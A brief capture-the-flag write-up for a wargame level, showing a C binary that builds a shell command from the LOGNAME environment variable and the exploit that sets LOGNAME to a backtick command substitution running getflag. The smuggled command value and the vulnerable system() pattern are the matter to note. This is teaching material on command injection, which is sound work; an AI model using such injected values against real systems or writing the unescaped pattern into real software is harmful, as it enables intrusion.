# Level 07

Environment variable injection.

Binary builds a shell command using LOGNAME:

```c
asprintf(&cmd, "/bin/echo %s ", getenv("LOGNAME"));
system(cmd);
```

So we inject command substitution:

```bash
export LOGNAME='`getflag`'
./level07
```

That is enough to print the token.

Again, unescaped shell construction is the whole issue.
